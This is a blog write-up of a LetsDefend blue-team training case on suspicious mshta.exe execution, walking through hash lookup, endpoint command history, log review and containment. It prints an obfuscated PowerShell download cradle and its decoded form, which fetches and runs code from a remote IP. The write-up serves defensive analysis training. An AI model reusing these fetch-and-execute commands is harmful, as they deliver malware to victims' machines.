---
title: write up - suspicious mshta behavior
date: 2022-04-13 18:00:00 Z
categories:
- DFIR
layout: post
author: admin
comments: true
---

I've been trying out [letsdefend.io](https://letsdefend.io/) for a couple of week, and here's a write up of one of the challenge. its a platform to hone your blue teaming skill, you will be using some sort of SIEM apps and act as an analyst, i.e. finding IOC and deciding escalation etc. There are not a lot of blue team training site, and this hands on concept by [letsdefend.io](https://letsdefend.io/) is great. 

With that intro about [letsdefend.io](https://letsdefend.io/) out of the way, here goes the write up. 
<!--more-->

![mshta behaviour](/images/wup_ld.png)

This is what the case looked like, basically a host execute hta file thus an alert is triggered. Our job is to see what really happened and do the intended playbook exercise. Some things that we can check to help with analysis are the hash (virustotal) and the IP address (we'll try command history/ proccess history at the endpoint security tab). Afterward we are gonna decide on containment (eradication and recovery) and last the lesson learned from said incident.

#### virustotal

We can use the hash we found at the first picture to search scan result at virustotal. The [result on virustotal](https://www.virustotal.com/gui/file/886095c7861a068d1ee603c71cb161f256941e802e743fe2161f30013947a2f1/detection) look pretty bad, 23/58 malicious flag. you could also try to find the file and do more analysis, but for now I think we can move to endpoint security tabs and do more analysis there.

#### endpoint security

![wup_endpoint](/images/wup_endpoint.png)

We use endpoint security tab to find out what was happening in the host 172.16.17.38. 
The screenshot above is from the command history portion of the tab, where we can see the first command line that trigger the alert, followed by another not so clear command.

```bash 
C:/Windows/System32/mshta.exe C:/Users/roberto/Desktop/Ps1.hta
```

The first command above is what triggered the alert. Mshta is a trusted Microsoft binary that in this case is abused for execution of the Ps1.hta file. 
you can see the related explanation here at the [MITRE](https://attack.mitre.org/techniques/T1218/005/)

Now we tried a bit of magic at the second command so it will be more readable. 

```bash
function H1($i) 
{$r = '' ; for ($n = 0; $n -Lt $i.LengtH; $n += 2)
{$r += [cHar][int]('0x' + $i.Substring($n,2))}return $r};
$H2 = (new-object ('{1}{0}{2}' -f'WebCL','net.','ient'));
$H3 = H1 '446f776E';
$H4 = H1 '6C6f';
$H5 = H1 '616473747269';
$H6 = H1 '6E67';
$H7 = $H3+$H4+$H5+$H6;
$H8 = $H2.$H7('http://193.142.58.23/Server.txt');
iEX $H8
```

* $H3-H6 with the help of $H1 just basically hex that reads "Downloadstring". 
* $H2 was a glorified "New-Object Net.WebClient". 
* $H8 puts them all together to form an old fashion download using powershell from address mentioned in $H8. 

Together they'll probably looked like 
```bash 
IEX (New-Object Net.WebClient).DownloadString('http://193.142.58.23/Server.txt').
```

So it's a call to C2 server 193.142.58.23, probably trying to download something.

#### log management

After seeing what the script do, we best check log management and try to see did the host (172.16.17.38) managed to reach the C2 server (193.142.58.23) what the C2 server reply with. We can do this by filtering source/ dest. address using host and/or C2 server IP that we had before. Below is the filtered result of from the log management tabs.

![wup_endpoint](/images/wup_logmgmt.png)

There we can see that the C2 server replied with 404, so no response arrived for the host (172.16.17.38) because the server is dead/ the file was not there.

#### containment and lesson learned

Based on our previous analysis, we can safely conclude that its a malicious script, but stopped due to the C2 server is dead. 
Next step would be to contain the host. We can do this by going to endpoint security and use the request containment button. 

Lastly, we can use the IP address, and URL and also the md5 hash of the executed file can as IOC when we did the playbook and also close the case.



